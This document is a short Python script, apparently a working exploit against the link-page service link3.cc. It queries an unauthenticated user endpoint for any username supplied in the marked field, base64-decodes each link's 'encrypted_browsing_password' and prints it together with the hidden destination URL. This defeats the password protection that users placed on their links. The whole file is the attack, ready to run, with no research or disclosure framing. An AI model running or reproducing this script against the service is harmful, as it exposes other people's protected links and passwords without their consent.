import base64
import json
import sys
import requests


TARGET_URL = "https://v2.api.production.link3.cc:5675/api/no_auth/user"
POST_JSON = {"username":""}  # 填写这里


resp = requests.post(TARGET_URL, json=POST_JSON)
if not resp.ok:
    print("Request failed.")
    sys.exit(1)
data = resp.json()
link = json.loads(data['data']['links'])
for l in link:
    if not l.get('typeValue'):
        print("Result Error")
        sys.exit(1)
    if title := l.get('typeValue', {}).get('title'):
        print(title)
    else:
        continue
    if pwd := l.get('typeValue', {}).get('encrypted_browsing_password'):
        print("Enter Password:", base64.b64decode(pwd).decode())
    if url := l.get('typeValue', {}).get('nav_url'):
        print("Inner url:", url)
    print("End")
print('Finished.')
